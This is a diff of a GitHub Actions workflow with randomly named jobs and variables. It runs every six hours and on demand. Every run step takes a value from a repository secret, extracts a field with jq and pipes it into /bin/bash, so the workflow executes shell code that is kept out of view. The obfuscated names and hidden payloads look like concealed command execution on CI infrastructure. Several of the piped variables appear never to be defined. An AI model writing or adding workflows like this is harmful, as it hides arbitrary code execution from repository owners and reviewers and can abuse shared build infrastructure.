@@ -3,29 +3,23 @@ name: shilaoqian3627
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
+    - cron: '31 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: shilaoqian3627
         env:
-          k53986: ${{ secrets.k53986 }}
+          ewtn89913: ${{ secrets.ewtn89913 }}
         run: |
-          echo $k53986 | jq -r .apc512 | /bin/bash
-          echo $ww298 | jq -r .ilmi2 | /bin/bash
-          echo $sxlhq7 | jq -r .ntl989 | /bin/bash
-          echo $w7 | jq -r .hdky59471 | /bin/bash
-          echo $km5 | jq -r .dn98404 | /bin/bash
-          echo $i0798 | jq -r .nvnby2 | /bin/bash
-          echo $zg6193 | jq -r .p4 | /bin/bash
-          echo $r75238 | jq -r .lpcgd6 | /bin/bash
-          echo $xfj81 | jq -r .vqeaj0 | /bin/bash
-          echo $e84075 | jq -r .sib3437 | /bin/bash
-          echo $o06 | jq -r .jenvf7804 | /bin/bash
-          echo $zfes5 | jq -r .h567 | /bin/bash
-          echo $hhg0569 | jq -r .wg512 | /bin/bash
-          echo $qgm4 | jq -r .hu2112 | /bin/bash
+          echo $ewtn89913 | jq -r .adt88973 | /bin/bash
+          echo $cdi70700 | jq -r .kau35213 | /bin/bash
+          echo $hr7 | jq -r .deby0378 | /bin/bash
+          echo $pb43 | jq -r .jl70 | /bin/bash
+          echo $ywfq9 | jq -r .r11799 | /bin/bash
+          echo $kymwc95416 | jq -r .bixtd64 | /bin/bash
+          echo $yieml5669 | jq -r .w1735 | /bin/bash
+          echo $bdj6 | jq -r .bmka26 | /bin/bash
+          echo $lds90 | jq -r .hdprc61 | /bin/bash
 
